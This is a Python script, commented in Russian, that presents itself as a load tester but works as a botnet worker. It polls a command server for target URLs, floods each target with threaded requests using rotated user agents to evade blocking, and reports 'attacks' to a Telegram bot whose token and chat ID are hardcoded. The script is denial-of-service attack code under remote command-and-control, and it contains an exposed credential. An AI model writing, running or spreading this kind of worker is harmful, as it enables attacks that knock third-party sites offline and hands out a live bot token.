import requests
import concurrent.futures
import time
import os
import random # Для рандомизации User Agent и снижения вероятности блокировки

# --- ⚠️ НАСТРОЙКИ (ТВОИ ДАННЫЕ) ⚠️ ---
# Это адрес сервера твоего телефона
MOBILE_SERVER_URL = "http://192.168.25.6:8080/" 

REPORTS_BOT_TOKEN = "8152994045:AAGEYWG4J0EPXDlJ49plLK_5Zm9y07YbpNg"
REPORTS_CHAT_ID = 8129366834 

# Константы для нагрузочного теста (оптимизировано для слабого ПК)
NUM_THREADS = 20  
REQUESTS_PER_THREAD = 3 
# -------------------------------------

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
]

def notify_telegram(message):
    """Отправляет уведомление в Телеграм."""
    url = f"https://api.telegram.org/bot{REPORTS_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": REPORTS_CHAT_ID, "text": message}
    try:
        requests.post(url, data=payload, timeout=5)
    except Exception:
        pass

def send_request(url):
    """Отправляет один запрос с рандомным User Agent."""
    headers = {'User-Agent': random.choice(USER_AGENTS)}
    try:
        response = requests.get(url, headers=headers, timeout=10)
        return response.status_code < 400
    except:
        return False

def load_test(url):
    """Запускает нагрузочный тест."""
    total_requests = NUM_THREADS * REQUESTS_PER_THREAD
    start_time = time.time()
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
        futures = [executor.submit(send_request, url) for _ in range(total_requests)]
        results = [f.result() for f in concurrent.futures.as_completed(futures)]

    total_time = time.time() - start_time
    success_count = sum(results)
    
    # 70% успешных запросов — минимальный порог для "выдержал"
    status = "✅ выдержал" if success_count / total_requests >= 0.7 else "❌ УПАЛ"
        
    return (
        f"🤖 ВОРКЕР {os.getpid()} ({os.uname()[1]}):\n"
        f"Цель: {url}\n"
        f"Статус: {status}\n"
        f"Успешно: {success_count}/{total_requests} ({total_time:.2f} сек.)"
    )

def main_loop():
    """Основной цикл: опрашивает сервер и запускает тест."""
    last_run_url = ""
    notify_telegram(f"🔥 Воркер {os.getpid()} подключен. Сервер: {MOBILE_SERVER_URL}")
    
    while True:
        try:
            # 1. Получаем команду от сервера (телефона)
            command = requests.get(MOBILE_SERVER_URL, timeout=5).text.strip()
            
            # 2. Проверяем, есть ли новая команда и не "idle" ли она
            if command != "idle" and command != last_run_url:
                last_run_url = command
                
                notify_telegram(f"🚨 Воркер {os.getpid()} атакует: {command}")
                result_message = load_test(command)
                notify_telegram(result_message)
                
            elif command == "idle":
                # Если команда сброшена, сбрасываем локальный URL, чтобы можно было запустить снова
                last_run_url = ""

        except Exception:
            # Скрытно обрабатываем ошибки (например, потеря связи с Wi-Fi)
            pass
        
        # Опрашиваем сервер каждые 5 секунд
        time.sleep(5)

if __name__ == "__main__":
    main_loop()

